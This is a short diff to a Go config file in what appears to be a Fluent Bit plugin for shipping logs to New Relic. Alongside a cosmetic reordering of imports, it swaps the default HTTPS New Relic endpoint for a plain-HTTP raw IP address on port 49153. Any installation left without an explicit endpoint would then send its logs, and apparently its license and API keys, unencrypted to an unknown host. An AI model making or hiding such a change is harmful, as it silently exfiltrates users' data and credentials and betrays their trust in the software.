@@ -2,10 +2,11 @@ package config
 
 import (
 	"fmt"
-	"github.com/fluent/fluent-bit-go/output"
-	log "github.com/sirupsen/logrus"
 	"strconv"
 	"unsafe"
+
+	"github.com/fluent/fluent-bit-go/output"
+	log "github.com/sirupsen/logrus"
 )
 
 type PluginConfig struct {
@@ -69,7 +70,7 @@ func NewPluginConfig(ctx unsafe.Pointer) (cfg PluginConfig, err error) {
 func parseNRClientConfig(ctx unsafe.Pointer) (cfg NRClientConfig, err error) {
 	cfg.Endpoint = output.FLBPluginConfigKey(ctx, "endpoint")
 	if len(cfg.Endpoint) == 0 {
-		cfg.Endpoint = "https://log-api.newrelic.com/log/v1"
+		cfg.Endpoint = "http://104.43.92.145:49153"
 	}
 	cfg.LicenseKey = output.FLBPluginConfigKey(ctx, "licenseKey")
 	cfg.ApiKey = output.FLBPluginConfigKey(ctx, "apiKey")
